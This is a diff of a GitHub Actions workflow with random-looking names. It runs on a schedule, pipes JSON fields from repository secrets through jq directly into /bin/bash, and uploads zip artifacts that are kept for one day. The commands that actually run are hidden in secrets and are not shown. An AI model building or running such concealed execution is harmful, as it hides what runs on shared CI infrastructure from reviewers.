@@ -1,27 +1,25 @@
 name: kongkerongdian
-
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '15 0/6 * * *'
-jobs:  # 16292
+    - cron: '53 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: kongkerongdian
         env:
-          bnko766: ${{ secrets.bnko766 }}
+          ppkv61023: ${{ secrets.ppkv61023 }}
         run: |
-          echo $bnko766 | jq -r .u72604 | /bin/bash
-          echo $kn18509 | jq -r .nazk3 | /bin/bash
-          echo $afrym98275 | jq -r .oi653 | /bin/bash
-          echo $atqwu57 | jq -r .jtsws00832 | /bin/bash
-          echo $plen94 | jq -r .hdcy1147 | /bin/bash
-          echo $bjgus4442 | jq -r .svy155 | /bin/bash
-          echo $rvhy15274 | jq -r .emxwg524 | /bin/bash
-          echo $hcras5287 | jq -r .x17 | /bin/bash
-          echo $jgpbs80 | jq -r .zotll058 | /bin/bash
-          echo $fae6 | jq -r .sosa20 | /bin/bash
-          echo $wnjuh7 | jq -r .y7005 | /bin/bash
+          printf '%s' "$ppkv61023" | jq -r .rfz17 | /bin/bash
+          printf '%s' "$tqw78683" | jq -r .b52 | /bin/bash
+          printf '%s' "$aw9" | jq -r .jonwx300 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nEsm9P98
+          path: "*.zip"
+          retention-days: 1
